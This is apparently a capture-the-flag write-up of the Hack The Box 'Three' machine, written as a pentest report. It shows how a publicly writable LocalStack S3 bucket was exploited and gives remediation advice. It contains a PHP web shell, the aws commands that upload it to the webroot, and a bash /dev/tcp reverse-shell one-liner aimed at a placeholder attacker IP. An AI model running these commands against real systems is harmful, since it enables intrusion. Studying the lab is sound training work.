@@ -1,1 +1,59 @@
 https://labs.hackthebox.com/achievement/machine/3142066/489    (achievement) 
+
+
+
+Executive Summary
+
+During a security assessment of the target environment (Three / thetoppers.htb), a critical misconfiguration was identified in the organization's cloud-integrated infrastructure. The target web application handles virtual host routing and utilizes a locally simulated Amazon AWS S3 bucket (via LocalStack) as its webroot storage device.
+
+Because the S3 bucket was configured with public write access and lacked proper authentication checks, it was possible to upload an arbitrary PHP payload directly into the webroot, leading to complete Remote Code Execution (RCE) and unauthorized access to the host file system.
+Technical Analysis & Exploitation Walkthrough
+1. Information Gathering & Subdomain Enumeration
+
+An initial port scan revealed standard web services running on Port 80 (HTTP). Inspection of the primary landing page source code indicated a PHP backend environment (/action_page.php).
+
+To identify hidden cloud storage infrastructure tied to host-based routing, subdomain enumeration was conducted against the thetoppers.htb domain. This process successfully discovered an exposed storage subdomain:
+Plaintext
+
+s3.thetoppers.htb
+
+2. Service Fingerprinting
+
+Direct inspection of the discovered subdomain via HTTP requests returned a status payload ({"status": "running"}) accompanied by custom response headers:
+
+    x-localstack-target
+
+    x-amz-acl, x-amz-version-id, x-amz-date
+
+The headers confirmed that the subdomain hosts an Amazon S3 (Simple Storage Service) object bucket simulated via a LocalStack instance.
+3. Vulnerability Exploitation (Unauthenticated S3 Write)
+
+The AWS command-line interface (awscli) was initialized with arbitrary credentials to test the bucket's access controls. The bucket security policy was found to be completely open, allowing unauthenticated listing and object manipulation:
+Bash
+
+# Listing the bucket contents revealed the website's live webroot
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+Because the S3 bucket maps directly to the active web server directory hosting index.php, a lightweight PHP web shell was created and successfully copied to the remote cloud bucket:
+Bash
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+
+4. Code Execution & Reverse Shell Access
+
+The web shell was verified operational by triggering system commands through URL parameters (/shell.php?cmd=id), executing as the low-privilege www-data user account.
+
+To transition from basic web-shell execution to an interactive command-line session, a Netcat listener was established on the local attack platform, and a reverse shell payload was issued via a URL-encoded request:
+Bash
+
+curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LOCAL_IP>/1337 0>&1'" http://thetoppers.htb/shell.php
+
+The server successfully initiated a outbound connection back to the listener, establishing an interactive shell environment on the host machine (www-data@three), allowing the retrieval of system data stored at /var/www/flag.txt.
+Remediation Recommendations
+
+    Implement Strict IAM Access Control Policies: Restrict the AWS S3 bucket ACL permissions. Ensure that public write capabilities are disabled (Block Public Access enabled), and enforce strict IAM policies so that only designated service accounts or internal system processes can put or modify objects.
+
+    Isolate Webroot Permissions: Avoid mapping directly writable, publicly accessible S3 storage folders into an active webroot where executable scripts (such as .php, .sh, or .cgi) can be run by the web server.
+
+    Input Validation & File Execution Restrictions: Configure the Apache/web server directory rules to explicitly deny execution permissions for script engines within user-upload or storage directories. Ensure file uploads are validated against an explicit whitelist of non-executable MIME types.
